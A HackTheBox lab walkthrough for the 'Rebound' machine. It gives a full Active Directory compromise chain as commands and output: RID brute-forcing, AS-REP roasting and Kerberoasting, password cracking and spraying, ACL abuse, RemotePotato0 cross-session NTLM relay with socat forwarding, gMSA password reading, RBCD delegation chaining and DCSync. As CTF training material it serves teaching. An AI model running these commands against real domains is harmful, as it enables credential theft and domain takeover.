---
title: "Rebound - HackTheBox"
date: 2025-10-24 00:10:00 +0800
categories: [Walkthroughs]
description: "Non Seasonal Machine — Windows [Insane]"
tags: [HTB, Cross-session Relay, RBCD]
image: /assets/img/favicons/rebound-htb/1.png
---

### Introduction
[**Rebound**](https://app.hackthebox.com/machines/664) is a monster machine featuring a tricky Active Directory environment. User enumeration via RID brute-forcing reveals an AS-REP-roastable user, whose TGT is used to Kerberoast another user with a crackable password. Weak ACLs are abused to obtain access to a group with FullControl over an OU, performing a Descendant Object Takeover (DOT), followed by a ShadowCredentials attack on a user with winrm access. On the target system, cross-session relay is leveraged to obtain the NetNTLMv2 hash of a logged-in user, which, once cracked, leads to a gMSA password read. Finally, the gMSA account allows delegation, but without protocol transition. Resource-Based Constrained Delegation (RBCD) is used to impersonate the Domain Controller, enabling a DCSync attack, leading to fully elevated privileges. 

#### TL;DR
> 1. **User Enumeration**: RID brute-forced valid domain users with `nxc --rid-brute`
> 2. **Kerberoasting (no pre-auth)**: Used `jjones` AS-REP roastable context + `impacket-GetUserSPNs -no-preauth` → cracked `ldap_monitor` & `oorend` password (`Football1!`)
> 3. **BloodHound Path Discovery**: `rusthound` revealed `oorend` → `AddSelf@ServiceMgmt` → `GenericAll@Service Users OU` → **Descendant Object Takeover (DOT)**
> 4. **DOT Execution**:
>    - Added `oorend` to `ServiceMgmt` via `bloodyAD`
>    - Enabled ACL inheritance + `FullControl` on OU with `impacket-dacledit`
>    - Reset `winrm_svc` password
> 5. **Foothold**: `evil-winrm` as `winrm_svc` → user flag
> 6. **Cross-Session NTLM Relay**: Used `RemotePotato0` + `RunasCs` to relay from `winrm_svc` session to `tbrady` console session → captured & cracked `tbrady` NTLMv2
> 7. **gMSA Password Read**: `tbrady` has `ReadGMSAPassword` on `delegator$` → extracted gMSA NTLM hash via `nxc --gmsa`
> 8. **RBCD + Constrained Delegation Chain**:
>    - Set RBCD: `ldap_monitor` → `delegator$` (`impacket-rbcd`)
>    - Got forwardable TGS as `DC01$` to `delegator$` via S4U
>    - Chained `delegator$`'s constrained delegation (`http/DC01`) using `-additional-ticket`
>    - Final TGS as `DC01$@http/DC01` → **DCSync** → `Administrator` hash
> 9. **Domain Takeover**: Used `Administrator` NTLM hash via `nxc -x` to get root flag

### Initial Enumeration
An initial Nmap scan reveals a number of TCP ports, typical of a Windows domain controller (DC).
```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ nmap -p- -sCV --min-rate 2000 -v 10.129.232.31
Nmap scan report for 10.129.232.31
Host is up (0.11s latency).
Not shown: 65376 closed tcp ports (conn-refused), 134 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
56425/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Updating our `/etc/hosts` entry for local DNS resolution over the VPN:
```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ nxc smb DC01.rebound.htb -u 'guest' -p '' --generate-hosts-file "$(pwd)/hosts"
```
```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ sudo cat hosts >> /etc/hosts
```

#### Enumerate Users via RID Brute-forcing
We use nxc to brute-force user RIDs and extract valid domain accounts:
```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ nxc smb DC01.rebound.htb -u 'guest' -p '' --rid-brute 10000
```
> By default, typical RID Brute-forcing go up to RID 4000. For larger domains, it may be necessary to expand max number.

And we got 13 valid account on the domain.
```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ wc -l valid-users.txt 
13 valid-users.txt
```

### Roasting Targets
#### AS-REP Roasting
Without creds we can look for accounts that have the `DONT_REQUIRE_PREAUTH` flag set, allowing offline password cracking.
- Using the **Impacket**:

```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ impacket-GetNPUsers 'rebound.htb/' -dc-ip 10.129.232.31 \
 -no-pass -usersfile 'valid-users.txt' -outputfile asrep.hashes 
```

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ppaul doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User llune doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fflock doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mmalone doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jjones@REBOUND.HTB:539d677784995c362...<SNIP>...5907a8cc7264bb06
[-] User nnoon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_monitor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oorend doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User winrm_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User batch_runner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tbrady doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User delegator$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- We can perform the same operation with **NetExec**:

```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ nxc ldap 10.129.232.31 -u 'valid-users.txt' -p '' --asreproast ASREPROAST.txt
SMB         10.129.232.31    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAP        10.129.232.31    445    DC01             $krb5asrep$23$jjones@REBOUND.HTB:878af35ccf86995c362...<SNIP>...5907a8cc7264bb06
```

We see that `jjones` returns an encrypted TGT. Unfortunately, it does not seem to be crackable as our list, `rockyou.txt`, is exhausted. 

#### Kerberoasting without Creds and Pre-auth
> [Reference](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)

Impacket has been modified to support this with the `no-preauth` flag added for impacket-GetUserSPNs script:
```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ impacket-GetUserSPNs -no-preauth 'jjones' -usersfile valid-users.txt -outputfile kerb.hashes 'rebound.htb/' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Principal: ppaul - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: llune - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: fflock - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: mmalone - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: jjones - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: nnoon - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: oorend - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: winrm_svc - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: batch_runner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: tbrady - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```

We have successfully retrieved SPNs (excluding DC account) from both `ldap_monitor` and `delegator$`!
```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ cat kerb.hashes 
$krb5tgs$18$DC01$$REBOUND.HTB$*DC01$*$148a047b4b72126a9f86c2....<SNIP>....bc8e
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$fe1f31a9....<SNIP>....91a6
$krb5tgs$18$delegator$$REBOUND.HTB$*delegator$*$afb59a9b040b....<SNIP>....dd7d
```

**Cracking the Hashes**

Both `delegator$` (machine account) and `ldap_monitor` had SPNs set so were kerberoastable, giving us a hash for both. As we will later find out `delegator$` is a `gMSA` account so won't be crackable as `gMSA` accounts have 240-byte, non human-readable passwords. This shows both the best and worst way to manage service accounts' credentials!

```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ john kerb.hashes --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt             
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 (MD4 HMAC-MD5 RC4))
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]       (?)     
1g 0:00:00:10 DONE (2025-10-19 08:54) 0.09208g/s 1200Kp/s 1200Kc/s 1200KC/s 1Gobucs!..1DENA
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

**Password spraying**
We got two hits:
```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ nxc ldap DC01.rebound.htb -u 'valid-users.txt' -p '[REDACTED]' --continue-on-success --no-bruteforce
[...]
LDAP        10.129.232.31   389    DC01             [+] rebound.htb\ldap_monitor:[REDACTED]
LDAP        10.129.232.31   389    DC01             [+] rebound.htb\oorend:[REDACTED]
```

---

### Mapping the Domain with BloodHound
Collecting our data with `rusthound-ce`:
```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ rusthound -u 'ldap_monitor@rebound.htb' -p '[REDACTED]' -d rebound.htb -f dc01.rebound.htb
```
We discovered that we have `AddSelf` on `ServiceMgmt` then `GenericAll` over the `Service Users` OU, which could lead to a Descendant Object Takeover (DOT).
![1](/assets/img/favicons/rebound-htb/2.png)
![2](/assets/img/favicons/rebound-htb/3.png)
![2](/assets/img/favicons/rebound-htb/4.png)
![2](/assets/img/favicons/rebound-htb/5.png)
![2](/assets/img/favicons/rebound-htb/6.png)

#### Step 1: Adding `aoorend` to `SERVICEMGMT`

```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ bloodyAD --host 'dc01.rebound.htb' -d 'rebound.htb' -u 'oorend' -p '[REDACTED]' add groupMember 'SERVICEMGMT' 'oorend'
[+] oorend added to SERVICEMGMT
```

- Verify:

```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ bloodyAD --host 'dc01.rebound.htb' -d 'rebound.htb' -u 'oorend' -p '[REDACTED]' get object 'SERVICEMGMT' --attr member 

distinguishedName: CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
member: CN=oorend,CN=Users,DC=rebound,DC=htb; CN=fflock,CN=Users,DC=rebound,DC=htb; CN=ppaul,CN=Users,DC=rebound,DC=htb
```

#### Step 2: Taking Control Over `SERVICE USERS`

```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ bloodyAD --host 'dc01.rebound.htb' -d 'rebound.htb' -u 'oorend' -p '[REDACTED]' add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
```

#### Step 3: Enable Inheritance + FullControl on OU
```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ impacket-dacledit -action write -rights FullControl -inheritance -principal 'oorend' -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'rebound.htb/oorend:[REDACTED]' -use-ldaps
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20251019-163831.bak
[*] DACL modified successfully!
```

#### Step 4: Reset winrm_svc Password
```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ bloodyAD --host 'dc01.rebound.htb' -d 'rebound.htb' -u 'oorend' -p '[REDACTED]' set password winrm_svc 'newPass123'
[+] Password changed successfully!
```

### Foothold via winrm_svc

#### Collecting User Flag

After logging in with the winrm user, the user flag can be found at `C:\Users\winrm_svc\Desktop\user.txt`.
```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ evil-winrm -i 'rebound.htb' -u 'winrm_svc' -p 'newPass123'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> type ..\Desktop\user.txt

```

### Lateral Movement

The only way to get to `tbrady` seemed to be the fact he has a session on the the DC, as the user had no inbound ACEs or special privileges.

> As we can confirm with **winPEAS output** that `tbrady` is already logged in 
> ![1](/assets/img/favicons/rebound-htb/7.png)


After a long search, we discovered an exploit path with one of the Potatos techniques called `Cross-session Relay`, by setting up a local listener and coercing the privileged DCOM activation service to it, triggering an NTLM authentication of any user currently logged on (i.e. `tbrady`) in the target machine!

#### Step 1: Get session ID with `RunasCS` by running `qwinsta *`

```bash
PS C:\Users\winrm_svc\Documents> .\RunasCs.exe 'oorend' '[REDACTED]' "cmd /c qwinsta *" -l 9

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 
>services                                    0  Disc                        
 console           tbrady                    1  Active     

```

#### Step 2: Start Rogue Oxid Resolver Listener (on attacker machine)
Start a listener on the attacker box:

```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.232.31:9999 
```

#### Step 3: Trigger Relay from winrm_svc Session to tbrady Session

```powershell
PS C:\Users\winrm_svc\Documents> .\RemotePotato0.exe -m 2 -s 1 -r 10.10.17.7 -x 10.10.17.7 -p 9999
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on 10.10.17.7 to your victim machine on port 9998
[*] Example Network redirector: 
	sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9998
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] RPC relay server listening on port 9997 ...
[*] Starting RogueOxidResolver RPC Server listening on port 9998 ... 
[*] IStoragetrigger written: 102 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9998
[+] User hash stolen!

NTLMv2 Client	: DC01
NTLMv2 Username	: rebound\tbrady
NTLMv2 Hash	: tbrady::rebound:9a692de159731d19:55af3d2d50b41735af490f8b0436d908:01010000000000006aa29ec1...<SNIP>...000000000
```
And we get NTLMv2 hash of `tbrady`!

#### Step 4: Crack tbrady's hash
```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ john tdrady.hash -w=/usr/share/wordlists/rockyou.txt                                        
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]    (tbrady)     
1g 0:00:00:07 DONE (2025-10-18 12:41) 0.1381g/s 1683Kp/s 1683Kc/s 1683KC/s 5449977..5435844
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Awesome! Now following up with our previous attack path from `BloodHound`, `tbrady` has **ReadGMSAPassword** over `dlelegator$`, we can get is using `NetExec`:

```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ nxc ldap rebound.htb -u 'tbrady' -p '[REDACTED]' --gmsa
LDAP        10.129.232.31    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb) (signing:Enforced) (channel binding:Always)
LDAP        10.129.232.31    389    DC01             [+] rebound.htb\tbrady:[REDACTED] 
LDAP        10.129.232.31    389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.232.31    389    DC01             Account: delegator$           NTLM: [HASH_REDACTED]     PrincipalsAllowedToReadPassword: tbrady
```
- We can perform this action also with `bloodyAD`:

```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ bloodyAD --host dc01.rebound.htb -d rebound.htb -u tbrady -p '[REDACTED]' get object 'delegator$' --attr msDS-ManagedPassword
```
### Discovering Constrained Delegation

We can also find this remotely with `impacket-findDelegation`:
```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ impacket-findDelegation 'rebound.htb/delegator$' -hashes :[HASH_REDACTED] -target-domain rebound.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

AccountName  AccountType                          DelegationType  DelegationRightsTo    
-----------  -----------------------------------  --------------  ---------------------
delegator$   ms-DS-Group-Managed-Service-Account  Constrained     http/dc01.rebound.htb
```

We see that `delegator$` has `Constrained Delegation` to `http/DC01.rebound.htb` with no protocol transition, which means that the `S4U2Self` step does not produce a **forwardable ticket**, which also causes the `S4U2proxy` step to fail.

Originally, the `Service for User to Self` (S4U2self) protocol enables a service to request a Service Ticket on another user's behalf, but for its own use. Conversely, the `Service for User to Proxy` (S4U2proxy) protocol allows a service to request a Service Ticket on another user's behalf, but for a different service.

So We will use `Resource-Based Constrained Delegation` (RBCD) to allow `ldap_monitor` to impersonate any user to `delegator$`.
Then chain:
1. `ldap_monitor` → impersonate `DC01$` → get TGS to `delegator$`
2. `delegator$` → use its delegation → get TGS as `DC01$` to `http/DC01`
3. Use that ticket → DCSync

```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ impacket-rbcd 'rebound.htb/delegator$' -hashes :[HASH_REDACTED] -k -delegate-from `ldap_monitor` -delegate-to 'delegator$' -action write -dc-ip dc01.rebound.htb -use-ldaps
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)

┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ impacket-findDelegation 'rebound.htb/delegator$' -hashes :[HASH_REDACTED] -target-domain rebound.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

AccountName   AccountType                          DelegationType              DelegationRightsTo    
------------  -----------------------------------  --------------------------  ---------------------
ldap_monitor  Person                               Resource-Based Constrained  delegator$            
delegator$    ms-DS-Group-Managed-Service-Account  Constrained                 http/dc01.rebound.htb
```

#### Get TGS for `DC01$` on `delegator$`

Now, the `ldap_monitor` account is able to request a service ticket as any user on `delegator$`. I'm going to target the `DC01$` account, because the `Administrator` account is marked as sensitive, which gives the `NOT_DELEGATED`.

Let's get a ST (TGS ticket) as `DC01$` on `delegator$` `with impacket-getST`:

```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ impacket-getST 'rebound.htb/ldap_monitor:[REDACTED]' -spn `browser/dc01.rebound.htb` -impersonate `DC01$`
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
```

> **Note:** There is a clean up script resetting delegation settings, so if this doesn't work, We'll make sure to re-run the `impacket-rbcd` command again.

This saves a ticket as the `DC01$` account for `delegator$` into a file, and this time it is forwardable:

```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ impacket-describeTicket 'DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache' | grep 'Flags'
[*] Flags                         : (0x40a10000) forwardable, renewable, pre_authent, enc_pa_rep
```

This is what was missing earlier!

Now `delegator$` can use this ticket along with the `Constrained Delegation` to get a ST on `DC01` as `DC01`.

```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ impacket-getST -spn http/dc01.rebound.htb -impersonate 'DC01$' 'rebound.htb/delegator$' -hashes :[HASH_REDACTED] -additional-ticket DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*]     Using additional ticket DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache
```

### Dump Hashes

With this ticket as the `DC01$` account, we can dump hashes from the `DC`:

```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ KRB5CCNAME='DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache'

┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ impacket-secretsdump -no-pass -k 'dc01.rebound.htb' -just-dc-ntlm
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:[HASH_REDACTED]:[HASH_REDACTED]:::
```

#### Collecting Root Flag

```bash
┌──(kali㉿kali)-[~/HTB/Rebound]
└─$ nxc smb rebound.htb -u Administrator -H '[HASH_REDACTED]' -x 'type C:\Users\Administrator\root.txt'
SMB         10.129.232.31    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.31    445    DC01             [+] rebound.htb\Administrator:[REDACTED] (Pwn3d!)
SMB         10.129.232.31    445    DC01             [+] Executed command via wmiexec
                                                     23b55436e7513l3463f8b1abc34c2360
```

### Important Resources

- [Windows is and always will be a Potatoland](https://www.r-tec.net/r-tec-blog-windows-is-and-always-will-be-a-potatoland.html)

- [Constrained Delegation without Protocol Transition](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained#without-protocol-transition)

- [Abusing RBCD to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-accounts-collude---trustedtoauthfordelegation-who)